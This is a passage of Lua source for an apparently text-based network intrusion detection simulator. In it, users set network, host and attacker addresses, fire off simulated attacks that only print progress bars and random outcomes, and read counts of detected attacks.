         if transdata>=20 and transdatab>=50 and transdatax>=500 and ((g1==hostip1 and g2==hostip2 and g3==hostip3 and g4==hostip4) or (g1==hostip5 and g2==hostip6 and g3==hostip7 and g4==hostip8) or (g1==hostip9 and g2==hostip10 and g3==hostip11 and g4==hostip12) or (g1==hostip13 and g2==hostip14 and g3==hostip15 and g4==hostip16) or (b1==hostip17 and g2==hostip18 and g3==hostip19 and g4==hostip20) or (g1==hostip21 and g2==hostip22 and g3==hostip23 and g4==hostip24)) then
            if pk == 1 then
               io.write(pk .. " malware attack has been detected and it was made to " .. g1 .. "." .. g2 ..  "." .. g3 .. "." .. g4) 
            elseif pk > 1 then
                io.write(pk .. " malware attacks have been detected and the last was made to " .. g1 .. "." .. g2 ..  "." .. g3 .. "." .. g4) 
            else
                      io.write("No malware attacks were detected.")

            end
             else
          io.write("No malware attacks were detected.")
        end
        end
          if words[2]=="PROBE" then
         if transdata>=20 and transdatab>=50 and transdatax>=500 and ((uinx1==hostip1 and uinx2==hostip2 and uinx3==hostip3 and uinx4==hostip4) or (uinx1==hostip5 and uinx2==hostip6 and uinx3==hostip7 and uinx4==hostip8) or (uinx1==hostip9 and uinx2==hostip10 and uinx3==hostip11 and uinx4==hostip12) or (uinx1==hostip13 and uinx2==hostip14 and uinx3==hostip15 and uinx4==hostip16) or (uinx1==hostip17 and uinx2==hostip18 and uinx3==hostip19 and uinx4==hostip20) or (uinx1==hostip21 and uinx2==hostip22 and uinx3==hostip23 and uinx4==hostip24)) then
            if probe == 1 then
               io.write(probe .. " network probe has been detected and it was made to " .. uinx1 .. "." .. uinx2 ..  "." .. uinx3 .. "." .. uinx4) 
            elseif probe > 1 then
                io.write(probe .. " network probes have been detected and the last was made to " .. uinx1 .. "." .. uinx2 ..  "." .. uinx3 .. "." .. uinx4) 
            else
                      io.write("No network probes were detected.")

            end
             else
          io.write("No network probes were detected.")
        end
        end
        if words[2]=="CSRF" then
        if transdata>=20 and transdatab>=50 and transdatax>=500 and ((d1==hostip1 and d2==hostip2 and d3==hostip3 and d4==hostip4) or (d1==hostip5 and d2==hostip6 and d3==hostip7 and d4==hostip8) or (d1==hostip9 and d2==hostip10 and d3==hostip11 and d4==hostip12) or (d1==hostip13 and d2==hostip14 and d3==hostip15 and d4==hostip16) or (d1==hostip17 and d2==hostip18 and d3==hostip19 and d4==hostip20) or (d1==hostip21 and d2==hostip22 and d3==hostip23 and d4==hostip24)) then
            if d == 1 then
               io.write(d .. " cross-site request forgery attack has been detected and it was made to " .. d1 .. "." .. d2 ..  "." .. d3 .. "." .. d4) 
            elseif d > 1 then
                io.write(d .. " cross-site request forgery attacks have been detected and the last was made to " .. d1 .. "." .. d2 ..  "." .. d3 .. "." .. d4) 
            else
                      io.write("No Cross-site request forgery attacks were detected.")

            end
        else
          io.write("No Cross-site request forgery attacks were detected.")
        end
        end
        
        if words[2]=="ARP" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((f1==hostip1 and f2==hostip2 and f3==hostip3 and f4==hostip4) or (f1==hostip5 and f2==hostip6 and f3==hostip7 and f4==hostip8) or (f1==hostip9 and f2==hostip10 and f3==hostip11 and f4==hostip12) or (f1==hostip13 and f2==hostip14 and f3==hostip15 and f4==hostip16) or (f1==hostip17 and f2==hostip18 and f3==hostip19 and f4==hostip20) or (f1==hostip21 and f2==hostip22 and f3==hostip23 and f4==hostip24)) then
            if f == 1 then
               io.write(f .. " ARP spoofing attack has been detected and it was made to " .. f1 .. "." .. f2 ..  "." .. f3 .. "." .. f4) 
            elseif f > 1 then
                io.write(f .. " ARPspoofing attacks have been detected and the last was made to " .. f1 .. "." .. f2 ..  "." .. f3 .. "." .. f4) 
           else
                        io.write("No ARP spoofing attacks were detected.")

           end
           else
             io.write("No ARP spoofing attacks were detected.")
           
            end
        end
         
      if words[2]=="XPATH" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((xp1==hostip1 and xp2==hostip2 and xp3==hostip3 and xp4==hostip4) or (xp1==hostip5 and xp2==hostip6 and xp3==hostip7 and xp4==hostip8) or (xp1==hostip9 and xp2==hostip10 and xp3==hostip11 and xp4==hostip12) or (xp1==hostip13 and xp2==hostip14 and xp3==hostip15 and xp4==hostip16) or (xp1==hostip17 and xp2==hostip18 and xp3==hostip19 and xp4==hostip20) or (xp1==hostip21 and xp2==hostip22 and xp3==hostip23 and xp4==hostip24)) then
            if xpath == 1 then
               io.write(xpath .. " XPath injection has been detected and it was made to " .. xp1 .. "." .. xp2 ..  "." .. xp3 .. "." .. xp4) 
            elseif xpath > 1 then
                io.write(xpath .. " XPath injections have been detected and the last was made to " .. xp1 .. "." .. xp2 ..  "." .. xp3 .. "." .. xp4) 
           else
                        io.write("No XPath injections were detected.")

           end
           else
             io.write("No XPath injections were detected.")
           
            end
        end
        
         if words[2]=="LDAP" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((ldap1==hostip1 and ldap2==hostip2 and ldap3==hostip3 and ldap4==hostip4) or (ldap1==hostip5 and ldap2==hostip6 and ldap3==hostip7 and ldap4==hostip8) or (ldap1==hostip9 and ldap2==hostip10 and ldap3==hostip11 and ldap4==hostip12) or (ldap1==hostip13 and ldap2==hostip14 and ldap3==hostip15 and ldap4==hostip16) or (ldap1==hostip17 and ldap2==hostip18 and ldap3==hostip19 and ldap4==hostip20) or (ldap1==hostip21 and ldap2==hostip22 and ldap3==hostip23 and ldap4==hostip24)) then
            if psm == 1 then
               io.write(psm .. " LDAP injection has been detected and it was made to " .. ldap1 .. "." .. ldap2 ..  "." .. ldap3 .. "." .. ldap4) 
            elseif psm > 1 then
                io.write(psm .. " LDAP injections have been detected and the last was made to " .. ldap1 .. "." .. ldap2 ..  "." .. ldap3 .. "." .. ldap4) 
           else
                        io.write("No LDAP injections were detected.")

           end
           else
             io.write("No LDAP injections were detected.")
           
            end
        end
        
         if words[2]=="DIRTRAV" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((trav1==hostip1 and trav2==hostip2 and trav3==hostip3 and ldap4==hostip4) or (trav1==hostip5 and trav2==hostip6 and trav3==hostip7 and trav4==hostip8) or (trav1==hostip9 and trav2==hostip10 and trav3==hostip11 and trav4==hostip12) or (trav1==hostip13 and trav2==hostip14 and trav3==hostip15 and trav4==hostip16) or (trav1==hostip17 and trav2==hostip18 and trav3==hostip19 and trav4==hostip20) or (trav1==hostip21 and trav2==hostip22 and trav3==hostip23 and trav4==hostip24)) then
            if trav == 1 then
               io.write(trav .. " directory traversal attack has been detected and it was made to " .. trav1 .. "." .. trav2 ..  "." .. trav3 .. "." .. trav4) 
            elseif trav > 1 then
                io.write(trav .. " directory traversal attack have been detected and the last was made to " .. trav1 .. "." .. trav2 ..  "." .. trav3 .. "." .. trav4) 
           else
                        io.write("No directory traversal attacks were detected.")

           end
           else
             io.write("No directory traversal attacks were detected.")
           
            end
        end
        
        
         if words[2]=="MASQUERADE" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((ainz2==hostip1 and ainz3==hostip2 and ainz4==hostip3 and ainz5==hostip4) or (ainz2==hostip5 and ainz3==hostip6 and ainz4==hostip7 and ainz5==hostip8) or (ainz2==hostip9 and ainz3==hostip10 and ainz4==hostip11 and ainz5==hostip12) or (ainz2==hostip13 and ainz3==hostip14 and ainz4==hostip15 and ainz5==hostip16) or (ainz2==hostip17 and ainz3==hostip18 and ainz4==hostip19 and ainz5==hostip20) or (ainz2==hostip21 and ainz3==hostip22 and ainz4==hostip23 and ainz5==hostip24)) then
            if masq == 1 then
               io.write(masq .. " masquerade attack has been detected and it was made to " .. ainz2 .. "." .. ainz3 ..  "." .. ainz4 .. "." .. ainz5) 
            elseif masq > 1 then
                io.write(masq .. " masquerade attacks have been detected and the last was made to " .. ainz2 .. "." .. ainz3 ..  "." .. ainz4 .. "." .. ainz5) 
           else
                        io.write("No masquerade attacks were detected.")

           end
           else
             io.write("No masquerade attacks were detected.")
           
            end
        end
        
        
         if words[2]=="HIJACK" then
           if transdata>=20 and transdatab>=50 and transdatax>=500 and ((hij1==hostip1 and hij2==hostip2 and hij3==hostip3 and hij4==hostip4) or (hij1==hostip5 and hij2==hostip6 and hij3==hostip7 and hij4==hostip8) or (hij1==hostip9 and hij2==hostip10 and hij3==hostip11 and hij4==hostip12) or (hij1==hostip13 and hij2==hostip14 and hij3==hostip15 and hij4==hostip16) or (hij1==hostip17 and hij2==hostip18 and hij3==hostip19 and hij4==hostip20) or (hij1==hostip21 and hij2==hostip22 and hij3==hostip23 and hij4==hostip24)) then
            if hij == 1 then
               io.write(hij .. " session hijacking attack has been detected and it was made to " .. hij1 .. "." .. hij2 ..  "." .. hij3 .. "." .. hij4) 
            elseif hij > 1 then
                io.write(hij .. " session hijacking attacks have been detected and the last was made to " .. hij1 .. "." .. hij2 ..  "." .. hij3 .. "." .. hij4) 
           else
                        io.write("No session hijacking attacks were detected.")

           end
           else
             io.write("No session hijacking attacks were detected.")
           
            end
        end
        
   else 
      io.write("You must enable detectability.")
   end
         
         
elseif words[1]=="ATTEMPT" or words[1]=="attempt" then
           if paxname>=10 then
            if words[2]=="DOS" then
               if tonumber(words[3])~=nill and tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then

                
                 p1 = words[3]
              p2 = words[4]
              p3 = words[5]
              p4 = words[6]
              
                for x=1, 5 do
                randatt = attempts[ math.random( #attempts ) ]
                   io.write("\n+++++++++++++++++++++++++++++++++++")
delay_s(1)
io.write("+++++++++++++++++++++++++++++++++++")
                                  dosxp = dosxp + 1
                                  end
                                if (randatt == 'Successful') then
                          
                    
                           
                              if ((p1==hostip1 and p2==hostip2 and p3==hostip3 and p4==hostip4) or (p1==hostip5 and p2==hostip6 and p3==hostip7 and p4==hostip8) or (p1==hostip9 and p2==hostip10 and p3==hostip11 and p4==hostip12) or (p1==hostip13 and p2==hostip14 and p3==hostip15 and p4==hostip16) or (p1==hostip17 and p2==hostip18 and p3==hostip19 and p4==hostip20) or (p1==hostip21 and p2==hostip22 and p3==hostip23 and p4==hostip24)) and digdi==0 then
              z = z + 1
              genmal = genmal + math.random(8000,10000)
              gen = gen + math.random(600,150000) 
              genmala = genmal
               
              end
                           
                       else
                         tz = tz + math.random(600,1500)
                       end
                 

           io.write("\n" .. randatt .. " attempt for denial of service attack")
else
                io.write("Wrong parameters were entered")
               end

           elseif words[2]=="SHELL" then
            if tonumber(words[3])~=nill and tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then

 m1 = words[3]
              m2 = words[4]
              m3 = words[5]
              m4 = words[6]
                for x=1, 5 do
                                randatt = attempts[ math.random( #attempts ) ]

                   io.write("\n+++++++++++++++++++++++++++++++++++")
delay_s(1)
io.write("+++++++++++++++++++++++++++++++++++")
                 end
           io.write("\n" .. randatt ..  " attempt for shellcode execution")
             if (randatt == 'Successful') then
                          
                           if ((m1==hostip1 and m2==hostip2 and m3==hostip3 and m4==hostip4) or (m1==hostip5 and m2==hostip6 and m3==hostip7 and m4==hostip8) or (m1==hostip9 and m2==hostip10 and m3==hostip11 and m4==hostip12) or (m1==hostip13 and m2==hostip14 and m3==hostip15 and m4==hostip16) or (m1==hostip17 and m2==hostip18 and m3==hostip19 and m4==hostip20) or (m1==hostip21 and m2==hostip22 and m3==hostip23 and m4==hostip24)) and digdi==0  then
                           genmal = genmal + math.random(800,1000) 
                 gen = gen + math.random(1100,2500)
                 m = m + 1
                 end
              else
                 gen = gen + math.random(600,1500)
             end
             else
                io.write("Wrong parameters were entered")
               end
             
             elseif words[2]=="LDAP" then
             if tonumber(words[3])~=nill and tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
                 ldap1 = words[3]
                 ldap2 = words[4]
                 ldap3 = words[5]
                 ldap4 = words[6]
                for x=1, 5 do
                                randatt = attempts[ math.random( #attempts ) ]

                   io.write("\n+++++++++++++++++++++++++++++++++++")
delay_s(1)
io.write("+++++++++++++++++++++++++++++++++++")
                 end
           io.write("\n" .. randatt ..  " attempt for LDAP Injection")
             if (randatt == 'Successful') then
                        
                         if ((ldap1==hostip1 and ldap2==hostip2 and ldap3==hostip3 and ldap4==hostip4) or (ldap1==hostip5 and ldap2==hostip6 and ldap3==hostip7 and ldap4==hostip8) or (ldap1==hostip9 and ldap2==hostip10 and ldap3==hostip11 and ldap4==hostip12) or (ldap1==hostip13 and ldap2==hostip14 and ldap3==hostip15 and ldap4==hostip16) or (ldap1==hostip17 and ldap2==hostip18 and ldap3==hostip19 and ldap4==hostip20) or (ldap1==hostip21 and ldap2==hostip22 and ldap3==hostip23 and ldap4==hostip24)) and digdi==0 then
                           genmal = genmal + math.random(800,1000) 
                 gen = gen + math.random(110,250)
                 psm = psm + 1
                 
                 end
                
              else
                 gen = gen + math.random(60,150)
             end
             else
                io.write("Wrong parameters were entered")
               end
             
              elseif words[2]=="XPATH" then
              if tonumber(words[3])~=nill and tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
                 xp1 = words[3]
                 xp2 = words[4]
                 xp3 = words[5]
                 xp4 = words[6]
                for x=1, 5 do
                                randatt = attempts[ math.random( #attempts ) ]

                   io.write("\n+++++++++++++++++++++++++++++++++++")
delay_s(1)
io.write("+++++++++++++++++++++++++++++++++++")
                 end
           io.write("\n" .. randatt ..  " attempt for XPath Injection")
             if (randatt == 'Successful') then
                          
                          if ((xp1==hostip1 and xp2==hostip2 and xp3==hostip3 and xp4==hostip4) or (xp1==hostip5 and xp2==hostip6 and xp3==hostip7 and xp4==hostip8) or (xp1==hostip9 and xp2==hostip10 and xp3==hostip11 and xp4==hostip12) or (xp1==hostip13 and xp2==hostip14 and xp3==hostip15 and xp4==hostip16) or (xp1==hostip17 and xp2==hostip18 and xp3==hostip19 and xp4==hostip20) or (xp1==hostip21 and xp2==hostip22 and xp3==hostip23 and xp4==hostip24)) and digdi==0 then
                           genmal = genmal + math.random(800,1000) 
                 gen = gen + math.random(110,250)
                 xpath = xpath + 1
                 end
              else
                 gen = gen + math.random(60,150)
             end
             
             else
                io.write("Wrong parameters were entered")
               end

           elseif words[2]=="XSS" then
if tonumber(words[3])~=nill and tonumber(words[4])~=nill and tonumber(words[5])~=nill and tonumber(words[6])~=nill and words[7]==nill then
 e1 = words[3]
                 e2 = words[4]
                 e3 = words[5]
                 e4 = words[6]
                for x=1, 5 do
                                randatt = attempts[ math.random( #attempts ) ]

                   io.write("\n+++++++++++++++++++++++++++++++++++")
delay_s(1)
io.write("+++++++++++++++++++++++++++++++++++")
                 end
           io.write("\n" .. randatt .. " attempt for cross-site scripting attack")
                    if (randatt == 'Successful') then
                    
                    if ((e1==hostip1 and e2==hostip2 and e3==hostip3 and e4==hostip4) or (e1==hostip5 and e2==hostip6 and e3==hostip7 and e4==hostip8) or (e1==hostip9 and e2==hostip10 and e3==hostip11 and e4==hostip12) or (e1==hostip13 and e2==hostip14 and e3==hostip15 and e4==hostip16) or (e1==hostip17 and e2==hostip18 and e3==hostip19 and e4==hostip20) or (e1==hostip21 and e2==hostip22 and e3==hostip23 and e4==hostip24)) and digdi==0 then
                       genmal = genmal + math.random(200,5000) 
                                 gen = gen + math.random(5500,10500) 
                                 e = e + 1
                                 end
              else
                                 gen = gen + math.random(600,1500) 
             end
             else
                io.write("Wrong parameters were entered")
               end
             
             else
               io.write("Not valid parameters were entered")
           
           end     
             
           
           else
             io.write("No attacker's host has been set")
           end
                 
elseif words[1]=="GENERATE" or words[1]=="generate" then                
        if (transdata>=20 and transdatab>=50 and transdatax>=500 and paxname>=10 and digdi==0) or (transdata>=20 and transdatab>=50 and transdatax>=500 and transdatax>=500 and transhost>=20 and digdi==0) then
          if words[2]=="IN" and words[3] and words[4]==nil then
            if tonumber(words[3])~=nill then
              io.write("Inbound traffic has been generated (" .. words[3] .. " packets)")
               gen = gen + words[3]
               else
               io.write("Bad command arguments entered")
               end
          elseif words[2]=="OUT" and words[3] and words[4]==nil then
          if tonumber(words[3])~=nill then
               io.write("Outbound traffic has been generated (" .. words[3] .. " packets)")
              geno = geno + words[3]
              else
               io.write("Bad command arguments entered")
               end
                elseif words[2]=="MAL" and words[3] and words[4]==nil then
                 if tonumber(words[3])~=nill then
               io.write("Malicious traffic has been generated (" .. words[3] .. " packets)")
              genmal = genmal + words[3]
              genmalxfact = genmal
               else
               io.write("Bad command arguments entered")
               end
              else
              
               io.write("Not valid parameters were entered")
            end
        elseif paxname>=10 then 
          if words[2]=="IN" and words[3] and words[4]==nil then
             if tonumber(words[3])~=nill then
              io.write("Inbound traffic has been generated (" .. words[3] .. " packets)")
               else
               io.write("Bad command arguments entered")
               end
          elseif words[2]=="OUT" and words[3] and words[4]==nil then
               if tonumber(words[3])~=nill then
               io.write("Outbound traffic has been generated (" .. words[3] .. " packets)")
              else
               io.write("Bad command arguments entered")
               end
              
                elseif words[2]=="MAL" and words[3] and words[4]==nil then
                if tonumber(words[3])~=nill then
               io.write("Malicious traffic has been generated (" .. words[3] .. " packets)")  
                else
               io.write("Bad command arguments entered")
               end
              
              else
              
               io.write("Not valid parameters were entered")
            end
         else
           io.write("You must set at least one host in order to generate traffic")
         end
     
     
     elseif words[1]=="SET" or words[1]=="set" then
      if words[2]=="NETIP1" or words[2]=="netip1" then
       

         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
        
          netip1=words[3]
       netip2=words[4]
       netip3=words[5]
       netip4=words[6]
       
       
        
           if (netip1==netip5 and netip2==netip6 and netip3==netip7 and netip4==netip8) or (netip1==netip9 and netip2==netip10 and netip3==netip11 and netip4==netip12) or (netip1==netip13 and netip2==netip14 and netip3==netip15 and netip4==netip16) or (netip1==netip17 and netip2==netip18 and netip3==netip19 and netip4==netip20) then
        io.write("You have already set this IP address on an existing network")
           else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of the network in which NIDS is installed") 
       transdatax = transdatax + 500
       
           end
       
      
    else
                io.write("Not valid network address")
    end
        
        
        elseif words[2]=="NETIP2" or words[2]=="netip2" then
          if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         
          netip5=words[3]
       netip6=words[4]
       netip7=words[5]
       netip8=words[6]
      
     
      
        
         if (netip1==netip5 and netip2==netip6 and netip3==netip7 and netip4==netip8) or (netip5==netip9 and netip6==netip10 and netip7==netip11 and netip8==netip12) or (netip5==netip13 and netip6==netip14 and netip7==netip15 and netip8==netip16) or (netip5==netip17 and netip6==netip18 and netip7==netip19 and netip8==netip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a network in which NIDS is installed") 
       transdatax = transdatax + 500
       end
       
          else
                io.write("Not valid network address")
               end
        
        
        elseif words[2]=="NETIP3" or words[2]=="netip3" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         
         
         netip9=words[3]
       netip10=words[4]
       netip11=words[5]
       netip12=words[6]
       
     
      
        
         if (netip9==netip1 and netip10==netip2 and netip11==netip3 and netip12==netip4) or (netip5==netip9 and netip6==netip10 and netip7==netip11 and netip8==netip12) or (netip9==netip13 and netip10==netip14 and netip11==netip15 and netip12==netip16) or (netip9==netip17 and netip10==netip18 and netip11==netip19 and netip12==netip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a network in which NIDS is installed") 
       transdatax = transdatax + 500
       end
       
          else
                io.write("Not valid network address")
               end
         
        
        elseif words[2]=="NETIP4" or words[2]=="netip4" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         
         netip13=words[3]
       netip14=words[4]
       netip15=words[5]
       netip16=words[6]
      
      
      
        
         if (netip13==netip1 and netip14==netip2 and netip15==netip3 and netip16==netip4) or (netip13==netip9 and netip14==netip10 and netip15==netip11 and netip16==netip12) or (netip5==netip13 and netip6==netip14 and netip7==netip15 and netip8==netip16) or (netip13==netip17 and netip14==netip18 and netip15==netip19 and netip16==netip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a network in which NIDS is installed") 
       transdatax = transdatax + 500
       end
      
          else
                io.write("Not valid network address")
               end
       
        
        elseif words[2]=="NETIP5" or words[2]=="netip5" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         
         netip17=words[3]
       netip18=words[4]
       netip19=words[5]
       netip20=words[6]
       
      
        
         if (netip17==netip1 and netip18==netip2 and netip19==netip3 and netip20==netip4) or (netip17==netip9 and netip18==netip10 and netip19==netip11 and netip20==netip12) or (netip17==netip13 and netip18==netip14 and netip19==netip15 and netip20==netip16) or (netip5==netip17 and netip6==netip18 and netip7==netip19 and netip8==netip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a network in which NIDS is installed") 
       transdatax = transdatax + 500
       
       end
          else
                io.write("Not valid network address")
               end
         

      
      
      

       
       elseif words[2]=="HOSTIP1" or words[2]=="hostip1" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         hostip1=words[3]
       hostip2=words[4]
       hostip3=words[5]
       hostip4=words[6]
       if (netip1==hostip1 and netip2==hostip2 and netip3==hostip3) or (netip5==hostip1 and netip6==hostip2 and netip7==hostip3) or (netip9==hostip1 and netip10==hostip2 and netip11==hostip3) or (netip13==hostip1 and netip14==hostip2 and netip15==hostip3) or (netip17==hostip1 and netip18==hostip2 and netip19==hostip3) then
       
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a host inside NIDS") 
       
       transhost = transhost + 20
       
       else
         io.write("This IP address does not map to an installed network")
       end  
       
          else
                io.write("Wrong parameters were entered")
               end
         
        
        elseif words[2]=="HOSTIP2" or words[2]=="hostip2" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
          hostip5=words[3]
       hostip6=words[4]
       hostip7=words[5]
       hostip8=words[6]
        if (netip1==hostip6 and netip2==hostip7 and netip3==hostip8) or (netip5==hostip6 and netip6==hostip7 and netip7==hostip8) or (netip9==hostip6 and netip10==hostip7 and netip11==hostip8) or (netip13==hostip6 and netip14==hostip7 and netip15==hostip8) or (netip17==hostip6 and netip18==hostip7 and netip19==hostip8) then
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a host inside NIDS") 
            
              transhost = transhost + 20
           else
         io.write("This IP address does not map to an installed network")
       end  
       
          else
                io.write("Wrong parameters were entered")
               end
         
        
        elseif words[2]=="HOSTIP3" or words[2]=="hostip3" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         hostip9=words[3]
       hostip10=words[4]
       hostip11=words[5]
       hostip12=words[6]
       
       if (netip1==hostip9 and netip2==hostip10 and netip3==hostip11) or (netip5==hostip9 and netip6==hostip10 and netip7==hostip11) or (netip9==hostip9 and netip10==hostip10 and netip11==hostip11) or (netip13==hostip9 and netip14==hostip10 and netip15==hostip11) or (netip17==hostip9 and netip18==hostip10 and netip19==hostip11) then
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been as the address of a host inside NIDS") 
             
              transhost = transhost + 20
               else
         io.write("This IP address does not map to an installed network")
       end  

          else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="HOSTIP4" or words[2]=="hostip4" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         hostip13=words[3]
       hostip14=words[4]
       hostip15=words[5]
       hostip16=words[6]
       if (netip1==hostip13 and netip2==hostip14 and netip3==hostip15) or (netip5==hostip13 and netip6==hostip14 and netip7==hostip15) or (netip9==hostip13 and netip10==hostip14 and netip11==hostip15) or (netip13==hostip13 and netip14==hostip14 and netip15==hostip15) or (netip17==hostip13 and netip18==hostip14 and netip19==hostip15) then
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a host inside NIDS") 
             
              transhost = transhost + 20
      else
         io.write("This IP address does not map to an installed network")
       end  
          else
                io.write("Wrong parameters were entered")
               end
         
        
        elseif words[2]=="HOSTIP5" or words[2]=="hostip5" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
          hostip17=words[3]
       hostip18=words[4]
       hostip19=words[5]
       hostip20=words[6]
       if (netip1==hostip18 and netip2==hostip19 and netip3==hostip20) or (netip5==hostip18 and netip6==hostip19 and netip7==hostip20) or (netip9==hostip18 and netip10==hostip19 and netip11==hostip20) or (netip13==hostip18 and netip14==hostip19 and netip15==hostip20) or (netip17==hostip18 and netip18==hostip19 and netip19==hostip20) then
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a host inside NIDS") 
            
              transhost = transhost + 20
else
         io.write("This IP address does not map to an installed network")
       end  
          else
                io.write("Wrong parameters were entered")
               end
          
        
        elseif words[2]=="HOSTIP6" or words[2]=="hostip6" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])~=nil and tonumber(words[6])~=0 and words[7]==nil then
         hostip21=words[3]
       hostip22=words[4]
       hostip23=words[5]
       hostip24=words[6]
       if (netip1==hostip21 and netip2==hostip22 and netip3==hostip23) or (netip5==hostip21 and netip6==hostip22 and netip7==hostip23) or (netip9==hostip21 and netip10==hostip22 and netip11==hostip23) or (netip13==hostip21 and netip14==hostip22 and netip15==hostip23) or (netip17==hostip21 and netip18==hostip22 and netip19==hostip23) then
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of a host inside NIDS") 
             
              transhost = transhost + 20
else
         io.write("This IP address does not map to an installed network")
       end  
          else
                io.write("Wrong parameters were entered")
               end
          
        
        
        elseif words[2]=="ATTNETIP1" or words[2]=="attnetip" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         attnetip1=words[3]
       attnetip2=words[4]
       attnetip3=words[5]
       attnetip4=words[6]
       
        if (attnetip1==attnetip5 and attnetip2==attnetip6 and attnetip3==attnetip7 and attnetip4==attnetip8) or (attnetip1==attnetip9 and attnetip2==attnetip10 and attnetip3==attnetip11 and attnetip4==attnetip12) or (attnetip1==attnetip13 and attnetip2==attnetip14 and attnetip3==attnetip15 and attnetip4==attnetip16) or (attnetip1==attnetip17 and attnetip2==attnetip18 and attnetip3==attnetip19 and attnetip4==attnetip20) then
        io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of the attacker's network") 
       paxname = paxname + 10
       
       end
       
          else
                io.write("Not valid network address")
               end
         
        
         elseif words[2]=="ATTNETIP2" or words[2]=="attnetip2" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         attnetip5=words[3]
       attnetip6=words[4]
       attnetip7=words[5]
       attnetip8=words[6]
       
       if (attnetip1==attnetip5 and attnetip2==attnetip6 and attnetip3==attnetip7 and attnetip4==attnetip8) or (attnetip5==attnetip9 and attnetip6==attnetip10 and attnetip7==attnetip11 and attnetip8==attnetip12) or (attnetip5==attnetip13 and attnetip6==attnetip14 and attnetip7==attnetip15 and attnetip8==attnetip16) or (attnetip5==attnetip17 and attnetip6==attnetip18 and attnetip7==attnetip19 and attnetip8==attnetip20) then
       io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attacker's network") 
       paxname = paxname + 10
       
       end
          else
                io.write("Not valid network address")
               end
          
        
         elseif words[2]=="ATTNETIP3" or words[2]=="attnetip3" then
         if tonumber(words[3])~=nil and tonumber(words[4])~=nil and tonumber(words[5])~=nil and tonumber(words[6])==0 and words[7]==nil then
         attnetip9=words[3]
       attnetip10=words[4]
       attnetip11=words[5]
       attnetip12=words[6]
       
       if (attnetip9==attnetip1 and attnetip10==attnetip2 and attnetip11==attnetip3 and attnetip12==attnetip4) or (attnetip5==attnetip9 and attnetip6==attnetip10 and attnetip7==attnetip11 and attnetip8==attnetip12) or (attnetip9==attnetip13 and attnetip10==attnetip14 and attnetip11==attnetip15 and attnetip12==attnetip16) or (attnetip9==attnetip17 and attnetip10==attnetip18 and attnetip11==attnetip19 and attnetip12==attnetip20) then
       io.write("You have already set this IP address on an existing network")
         else
             io.write(words[3] .. "." .. words[4] ..  "." .. words[5] .. "." .. words[6] .. " has been set as the address of an attacker's network") 
      paxname = paxname + 10
       end
       
       
          else
                io.write("Not valid network address")
               end
          
        
